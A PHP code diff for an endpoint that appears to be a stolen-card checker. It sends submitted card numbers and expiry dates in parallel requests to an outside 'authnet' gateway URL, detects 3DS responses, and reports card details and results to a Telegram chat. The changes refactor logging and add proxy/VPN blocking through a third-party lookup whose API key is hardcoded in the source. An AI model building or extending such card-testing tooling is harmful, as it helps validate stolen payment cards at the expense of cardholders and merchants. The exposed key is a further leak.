@@ -5,6 +5,17 @@ header('Content-Type: application/json');
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
 
+// --- MOVED log_message function to the top to prevent 500 errors ---
+// Optional file-based logging for debugging
+ $log_file = __DIR__ . '/paypal0.1$_debug.log';
+function log_message($message) {
+    global $log_file;
+    $timestamp = date('Y-m-d H:i:s');
+    // Ensure the message is a string
+    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
+    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
+}
+
 // Include cron_sync.php for validateApiKey
 require_once __DIR__ . '/refresh.php';
 
@@ -19,7 +30,7 @@ session_start([
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -29,7 +40,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -39,105 +50,90 @@ if (!$validation['valid']) {
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
 
+// --- NEW PROXY DETECTION LOGIC ---
+
+// Function to get the real user IP address
+function getUserIP() {
+    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR'];
+    foreach ($ip_keys as $key) {
+        if (array_key_exists($key, $_SERVER) === true) {
+            foreach (explode(',', $_SERVER[$key]) as $ip) {
+                $ip = trim($ip);
+                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+                    return $ip;
+                }
+            }
+        }
+    }
+    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
+}
+
 // Function to check if IP is a proxy
 function checkProxyIP($ip) {
+    // Check if cURL is available
+    if (!function_exists('curl_init')) {
+        log_message("cURL extension is not installed. Cannot perform proxy check.");
+        return false; // Fail open (allow access) if we can't check
+    }
+
     $api_url = "https://api.isproxyip.com/v1/check.php?key=zHwDyAMU6bJMIHCKfcDGnjMi7zq3S743dQXWBoqKNPCPEW4z94&ip=" . urlencode($ip) . "&format=json";
     
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $api_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10-second timeout
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     $response = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $error = curl_error($ch);
     curl_close($ch);
     
     if ($error) {
-        log_message("Proxy check CURL error: $error");
-        return false; // Default to not blocking on error
+        log_message("Proxy check CURL error for IP $ip: $error");
+        return false; // Fail open on error
     }
     
     if ($http_code !== 200) {
-        log_message("Proxy check HTTP error: $http_code");
-        return false; // Default to not blocking on error
+        log_message("Proxy check HTTP error for IP $ip: Status Code $http_code. Response: $response");
+        return false; // Fail open on error
     }
     
     $data = json_decode($response, true);
-    if (json_last_error() !== JSON_ERROR_NONE) {
-        log_message("Proxy check JSON decode error: " . json_last_error_msg());
-        return false; // Default to not blocking on error
+    if (json_last_error() !== JSON_ERROR_NONE || !isset($data['proxy'])) {
+        log_message("Proxy check JSON decode error or missing 'proxy' key for IP $ip. Response: $response");
+        return false; // Fail open on error
     }
     
     // Log the proxy check result
-    log_message("Proxy check for IP $ip: " . json_encode($data));
+    log_message("Proxy check result for IP $ip: " . json_encode($data));
     
     // Return true if proxy is detected (value > 0)
-    return isset($data['proxy']) && $data['proxy'] > 0;
+    return (int)$data['proxy'] > 0;
 }
 
-// Get user's IP address
-function getUserIP() {
-    // Check for shared internet/ISP IP
-    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-        return $_SERVER['HTTP_CLIENT_IP'];
-    }
-    
-    // Check for IPs passing through proxies
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        // Check if multiple IPs exist
-        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        foreach ($ips as $ip) {
-            $ip = trim($ip);
-            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-                return $ip;
-            }
-        }
-    }
-    
-    if (!empty($_SERVER['HTTP_X_REAL_IP']) && filter_var($_SERVER['HTTP_X_REAL_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-        return $_SERVER['HTTP_X_REAL_IP'];
-    }
-    
-    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && filter_var($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
-    }
-    
-    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && filter_var($_SERVER['HTTP_FORWARDED_FOR'], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-        return $_SERVER['HTTP_FORWARDED_FOR'];
-    }
-    
-    // Default to remote address
-    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
-}
-
-// Check if user's IP is a proxy
+// Get user's IP address and check for proxy
  $user_ip = getUserIP();
-log_message("Checking IP for proxy detection: $user_ip");
+log_message("Request received from IP: $user_ip");
 
 if (checkProxyIP($user_ip)) {
     http_response_code(403);
-    $errorMsg = ['status' => 'ERROR', 'message' => 'you are not allowed to access these resources', 'response' => 'Proxy detected'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: Proxy detected for IP ' . $user_ip . PHP_EOL, FILE_APPEND);
+    $errorMsg = ['status' => 'ERROR', 'message' => 'you are not allowed to access these resources', 'response' => 'Proxy/VPN detected'];
+    log_message("ACCESS DENIED - Proxy detected for IP: $user_ip");
     echo json_encode($errorMsg);
     exit;
 }
 
+// --- END OF PROXY DETECTION LOGIC ---
+
 // Enable error reporting for debugging (disable in production)
 ini_set('display_errors', 0);
 error_reporting(E_ALL);
-
-// Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
-function log_message($message) {
-    global $log_file;
-    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
-}
 
 // Function to check for 3DS responses
 function is3DAuthenticationResponse($response) {
@@ -198,15 +194,15 @@ function sendTelegramNotification($card_details, $status, $response) {
         'chat_id' => $chat_id,
         'text' => $message,
         'parse_mode' => 'HTML',
-        'disable_web_page_preview' => true  // Added to prevent link previews
+        'disable_web_page_preview' => true
     ];
 
     $ch = curl_init($telegram_url);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Changed to true for security
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Added timeout
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     $result = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $curl_error = curl_error($ch);
@@ -254,32 +250,6 @@ if (strlen($exp_year) === 2) {
 // API URL
  $api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';
 
-// Function to make parallel API request
-function makeRequest($url) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Enable SSL verification
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
-    $response = curl_exec($ch);
-    $error = curl_error($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    if ($error) {
-        log_message("CURL Error: $error");
-        return false;
-    }
-    
-    if ($http_code != 200) {
-        log_message("HTTP Error: $http_code");
-        return false;
-    }
-    
-    return $response;
-}
-
 // Create 3 parallel requests with slight variations
  $responses = [];
  $multi_handle = curl_multi_init();
@@ -291,8 +261,8 @@ for ($i = 0; $i < 3; $i++) {
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Enable SSL verification
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_multi_add_handle($multi_handle, $ch);
     $channels[$i] = $ch;
 }
